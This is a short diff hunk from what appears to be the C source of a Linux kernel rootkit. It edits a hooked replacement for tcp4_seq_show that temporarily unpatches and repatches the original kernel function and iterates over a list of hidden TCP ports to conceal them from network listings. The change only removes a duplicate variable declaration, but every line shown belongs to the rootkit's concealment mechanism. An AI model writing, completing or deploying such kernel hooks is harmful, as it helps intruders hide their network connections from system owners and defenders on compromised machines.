@@ -645,7 +645,7 @@ static int n_tcp4_seq_show ( struct seq_file *seq, void *v)
 	
     int (*original_tcp4_seq_show)(struct seq_file *, void *);
     original_tcp4_seq_show = asm_hook_unpatch(n_tcp4_seq_show);
-    int ret = original_tcp4_seq_show(seq, v);
+    ret = original_tcp4_seq_show(seq, v);
     asm_hook_patch(n_tcp4_seq_show);
 
     list_for_each_entry ( hp, &hidden_tcp4_ports, list )
